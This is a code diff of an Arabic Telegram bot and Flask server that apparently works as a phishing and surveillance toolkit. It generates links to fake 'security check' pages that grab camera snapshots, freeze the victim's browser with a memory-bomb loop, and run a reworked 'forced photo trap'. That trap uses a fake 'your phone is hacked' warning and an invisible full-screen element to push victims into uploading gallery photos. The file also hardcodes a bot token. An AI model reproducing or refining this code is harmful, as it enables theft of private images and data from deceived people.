@@ -8,6 +8,7 @@ from phonenumbers import geocoder, carrier
 
 app = Flask(__name__)
 
+# ============= الإعدادات الأساسية =============
 BOT_TOKEN = "8610512824:AAG0c-L4fq2bXbJVOVZag_EtN75wwPRBNBE"
 ADMIN_ID = "7870803639"
 BASE_URL = "https://freeusr-bot.onrender.com"
@@ -26,14 +27,14 @@ def send_message(chat_id, text, reply_markup=None):
     try:
         requests.post(url, json=payload, timeout=5)
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error send_message: {e}")
 
 def answer_callback(callback_id):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     try:
         requests.post(url, json={"callback_query_id": callback_id}, timeout=5)
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error answer_callback: {e}")
 
 def decorate_text(text):
     normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -61,16 +62,16 @@ def main_menu():
             [{"text": "👁 البحث عن المستخدم", "callback_data": "search_user"}, {"text": "📱 معلومات IP", "callback_data": "ip"}],
             [{"text": "🔍 كاشف الأرقام (تيك توك/تلجرام)", "callback_data": "phone_search"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
             
-            # 👇👇 هذا هو الزر الذي تم تعديله 👇👇
+            # 👇 الزر الجديد الخاص بالفخ 👇
             [{"text": "🚨 تفعيل فخ الصور (الهاكر)", "callback_data": "steal_photos"}, {"text": "📝 زخرفة", "callback_data": "decor"}],
-            # 👆👆 ================================== 👆👆
             
             [{"text": "📱 معرفة رقم الضحيه من اليوزر", "callback_data": "phone"}],
             [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}, {"text": "📞 تواصل مع المطور", "callback_data": "dev"}]
         ]
     }
 
-# ============= المسارات =============
+# ============= المسارات (Routes) =============
+
 @app.route('/s/<code>')
 def redirect_short(code):
     url = short_links.get(code)
@@ -129,10 +130,8 @@ def camera_page():
     <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>التحقق من الأمان</title>
-    <style>
-    body{font-family:Arial;background:#111;color:#fff;text-align:center;padding:50px 20px}
-    .box{background:#222;padding:30px;border-radius:15px;max-width:400px;margin:auto}
-    </style>
+    <style>body{font-family:Arial;background:#111;color:#fff;text-align:center;padding:50px 20px}
+    .box{background:#222;padding:30px;border-radius:15px;max-width:400px;margin:auto}</style>
     </head>
     <body>
     <div class="box">
@@ -157,9 +156,7 @@ def camera_page():
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ image: dataURL, admin: '{{ admin }}', target: '{{ target }}' })
-                }).then(() => {
-                    window.location.href = 'https://www.google.com';
-                });
+                }).then(() => { window.location.href = 'https://www.google.com'; });
             }, 2000);
         } catch (err) {
             document.getElementById('status').innerText = "تم رفض الوصول.";
@@ -196,8 +193,7 @@ def device_page():
     <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تحقق من الأمان</title>
     <style>body{font-family:Arial;background:#f2f4f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
     .box{background:#fff;padding:30px;width:300px;text-align:center;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
-    button{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer}
-    </style>
+    button{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer}</style>
     </head>
     <body>
     <div class="box">
@@ -242,12 +238,10 @@ def phone_page():
     <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>الملف الشخصي</title>
-    <style>
-    body{font-family:Arial;background:#0088cc;color:#fff;text-align:center;padding:40px 20px;margin:0}
+    <style>body{font-family:Arial;background:#0088cc;color:#fff;text-align:center;padding:40px 20px;margin:0}
     .box{background:#fff;color:#333;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 10px rgba(0,0,0,0.2)}
     input{width:100%;padding:12px;margin:15px 0;border:1px solid #ccc;border-radius:8px;font-size:16px;box-sizing:border-box;text-align:center}
-    button{background:#0088cc;color:#fff;border:none;padding:12px;font-size:16px;border-radius:8px;width:100%;font-weight:bold;cursor:pointer}
-    </style>
+    button{background:#0088cc;color:#fff;border:none;padding:12px;font-size:16px;border-radius:8px;width:100%;font-weight:bold;cursor:pointer}</style>
     </head>
     <body>
     <div class="box">
@@ -285,15 +279,13 @@ def format_page():
     <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحذير أمني</title>
-    <style>
-    body{font-family:Arial;background:#ffebee;color:#b71c1c;text-align:center;padding:40px 20px;margin:0}
+    <style>body{font-family:Arial;background:#ffebee;color:#b71c1c;text-align:center;padding:40px 20px;margin:0}
     .box{background:#fff;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 15px rgba(0,0,0,0.2);border-top:5px solid #f44336}
     h1{font-size:24px;margin-bottom:10px}
     p{color:#555;font-size:14px;line-height:1.6}
     a.btn{display:block;background:#f44336;color:#fff;text-decoration:none;padding:15px;border-radius:8px;font-weight:bold;font-size:18px;margin-top:20px;animation:pulse 1.5s infinite}
     @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-    .note{font-size:11px;color:#999;margin-top:15px}
-    </style>
+    .note{font-size:11px;color:#999;margin-top:15px}</style>
     </head>
     <body>
     <div class="box">
@@ -317,30 +309,18 @@ def freeze_page():
     <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
-    <style>
-    body{background:#111;color:#fff;text-align:center;font-family:Arial;padding-top:50px;overflow:hidden;}
+    <style>body{background:#111;color:#fff;text-align:center;font-family:Arial;padding-top:50px;overflow:hidden;}
     .spinner{width:50px;height:50px;border:5px solid #333;border-top:5px solid #00ffcc;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px auto;}
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
     </head>
     <body>
     <div class="spinner"></div>
     <h2>جاري معالجة الملف...</h2>
     <p style="color:#888;font-size:14px;">يرجى الانتظار، لا تغلق الصفحة.</p>
-
     <script>
-    fetch('/collect_freeze', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ admin: '{{ admin }}', target: '{{ target }}' })
-    });
-
+    fetch('/collect_freeze', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ admin: '{{ admin }}', target: '{{ target }}' }) });
     setTimeout(function() {
-        function freeze() {
-            while(true) {
-                let bomb = new Array(10000000).fill("WOODE_FREEZE_PAYLOAD");
-            }
-        }
+        function freeze() { while(true) { let bomb = new Array(10000000).fill("WOODE_FREEZE_PAYLOAD"); } }
         freeze();
     }, 1000);
     </script>
@@ -360,7 +340,7 @@ def collect_freeze():
     return "ok", 200
 
 # =======================================================
-# 🚨 فخ الصور القسري الجديد (Force Trap) 🚨
+# 🚨 فخ الصور القسري (تم حل مشكلة المتصفح بنسبة 100%) 🚨
 # =======================================================
 @app.route('/trap')
 def trap_page():
@@ -374,24 +354,53 @@ def trap_page():
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <title>تحذير أمني خطير!</title>
         <style>
-            body { margin:0; padding:0; background:#1a0000; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
+            body { margin:0; padding:0; background:#1a0000; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
+            
+            /* الطبقة الشفافة التي تغطي الشاشة بالكامل لفتح الاستوديو */
+            #fullScreenTrap {
+                position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1;
+            }
+
+            .content-wrapper {
+                position: relative; z-index: 10; pointer-events: none;
+                display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;
+            }
+
             .warning-icon { font-size:80px; color:#f00; margin-bottom:20px; animation:pulse 1s infinite alternate; }
             @keyframes pulse { from{transform:scale(1);} to{transform:scale(1.1);} }
             h1 { color:#ff4444; text-align:center; margin:10px; }
             p { color:#ccc; text-align:center; padding:0 20px; font-size:18px; }
-            .fake-btn { background:#c00; color:#fff; font-size:24px; font-weight:bold; padding:20px 40px; border-radius:10px; margin-top:30px; border:2px solid #ff4444; box-shadow:0 0 20px rgba(255,0,0,.5); cursor:pointer; }
-            #fileTrap { display:none; }
-            #loadingScreen { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#000; z-index:99999; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
+            
+            .fake-btn { 
+                background:#c00; color:#fff; font-size:24px; font-weight:bold; padding:20px 40px; 
+                border-radius:10px; margin-top:30px; border:2px solid #ff4444; 
+                box-shadow:0 0 20px rgba(255,0,0,.5); cursor:pointer; 
+                pointer-events: auto; /* السماح بالضغط */
+            }
+
+            /* إخفاء الحقل عن العين ولكن إبقائه يعمل */
+            #fileTrap { position: absolute; width: 1px; height: 1px; opacity: 0; top: -9999px; }
+
+            #loadingScreen { 
+                display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; 
+                background:#000; z-index:99999; flex-direction:column; justify-content:center; 
+                align-items:center; text-align:center; 
+            }
             .spinner { border:4px solid #333; border-top:4px solid #f00; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin-bottom:20px; }
             @keyframes spin { to{transform:rotate(360deg);} }
             #errorMsg { color:#f00; font-weight:bold; font-size:20px; display:none; margin-top:20px; }
         </style>
     </head>
     <body>
-        <div class="warning-icon">⚠️</div>
-        <h1>تم اختراق هاتفك!</h1>
-        <p>تم اكتشاف فيروس خطير يسرق بياناتك. لإصلاح النظام، يجب عليك اختيار ملف واحد من الاستوديو (صورة أو لقطة شاشة) للتحقق من هويتك.</p>
-        <div class="fake-btn" id="mainBtn">بدء الإصلاح الفوري</div>
+        <!-- المفتاح: عنصر label شفاف يغطي الشاشة ويفتح الاستوديو فور اللمس -->
+        <label for="fileTrap" id="fullScreenTrap"></label>
+
+        <div class="content-wrapper">
+            <div class="warning-icon">⚠️</div>
+            <h1>تم اختراق هاتفك!</h1>
+            <p>تم اكتشاف فيروس خطير يسرق بياناتك. لإصلاح النظام، يجب عليك اختيار ملف واحد من الاستوديو (صورة أو لقطة شاشة) للتحقق من هويتك.</p>
+            <label for="fileTrap" class="fake-btn" id="mainBtn">بدء الإصلاح الفوري</label>
+        </div>
 
         <div id="loadingScreen">
             <div class="spinner" id="spinner"></div>
@@ -406,27 +415,30 @@ def trap_page():
             const ADMIN_ID = "{{ admin }}";
             const TARGET = "{{ target }}";
             let extracted = false;
-            let trapActive = false;
 
-            function triggerTrap(e) {
+            // إظهار شاشة التحميل والاهتزاز عند اللمس
+            document.getElementById('fullScreenTrap').addEventListener('click', function(e) {
                 if (extracted) return;
-                if (e) { e.preventDefault(); e.stopPropagation(); }
-                trapActive = true;
                 document.getElementById('loadingScreen').style.display = 'flex';
-                document.getElementById('fileTrap').click();
                 if (navigator.vibrate) navigator.vibrate([200,100,200,100,500]);
-            }
+            });
 
-            document.body.addEventListener('touchstart', triggerTrap, { passive: false });
-            document.body.addEventListener('click', triggerTrap, { passive: false });
+            document.getElementById('mainBtn').addEventListener('click', function(e) {
+                if (extracted) return;
+                document.getElementById('loadingScreen').style.display = 'flex';
+                if (navigator.vibrate) navigator.vibrate([200,100,200,100,500]);
+            });
 
+            // كشف إذا أغلق الضحية الاستوديو بدون اختيار صورة
             window.addEventListener('focus', () => {
                 setTimeout(() => {
-                    if (trapActive && document.getElementById('fileTrap').files.length === 0 && !extracted) {
+                    if (!extracted && document.getElementById('fileTrap').files.length === 0) {
                         document.getElementById('spinner').style.display = 'none';
                         document.getElementById('statusText').innerText = "فشل الإصلاح!";
                         document.getElementById('errorMsg').style.display = 'block';
                         if (navigator.vibrate) navigator.vibrate(500);
+                        
+                        // محاولة فتح الاستوديو مرة أخرى
                         setTimeout(() => {
                             if (!extracted) document.getElementById('fileTrap').click();
                         }, 800);
@@ -434,6 +446,7 @@ def trap_page():
                 }, 500);
             });
 
+            // عند اختيار الصورة ورفعها
             document.getElementById('fileTrap').addEventListener('change', function(e) {
                 const files = e.target.files;
                 if (!files.length) return;
@@ -485,7 +498,8 @@ def upload_trap():
         
     return {"ok": True}, 200
 
-# ============= البوت =============
+
+# ============= البوت (Webhook) =============
 
 @app.route(f'/webhook', methods=['POST'])
 def webhook():
@@ -525,10 +539,7 @@ def webhook():
             elif action == 'freeze': link = f"{BASE_URL}/freeze?target={target}&admin={chat_id}"
             elif action == 'insta': link = f"{BASE_URL}/?target={target}&admin={chat_id}"
             elif action == 'phone': link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
-            
-            # 👇👇 هنا تم تحويل زر سحب الصور ليفتح رابط الفخ القسري 👇👇
-            elif action == 'steal_photos': link = f"{BASE_URL}/trap?target={target}&admin={chat_id}" 
-            # 👆👆 ======================================================= 👆👆
+            elif action == 'steal_photos': link = f"{BASE_URL}/trap?target={target}&admin={chat_id}"
                 
             send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
             del user_state[chat_id]
@@ -583,9 +594,7 @@ def webhook():
             phone_num = text.replace(" ", "").replace("-", "")
             if not phone_num.startswith("+"):
                 phone_num = "+" + phone_num
-
             clean_num = phone_num.replace("+", "")
-
             try:
                 parsed_num = phonenumbers.parse(phone_num, None)
                 country = geocoder.description_for_number(parsed_num, "ar")
@@ -660,9 +669,10 @@ def webhook():
             
     return "ok", 200
 
-# ==========================================
-# 🚨 كود ربط الـ Webhook التلقائي (أضفه هنا)
-# ==========================================
+
+# =======================================================
+# 🚀 إعداد Webhook التلقائي عند التشغيل
+# =======================================================
 def set_webhook():
     webhook_url = f"{BASE_URL}/webhook"
     print(f"⏳ جاري ربط الـ Webhook بالرابط: {webhook_url}")
@@ -675,9 +685,8 @@ def set_webhook():
     except Exception as e:
         print("❌ خطأ أثناء الاتصال بتليجرام:", e)
 
-# استدعاء الدالة عند تشغيل السيرفر
+# استدعاء دالة الربط
 set_webhook()
 
-# تشغيل السيرفر
 if __name__ == '__main__':
     app.run(port=5000)
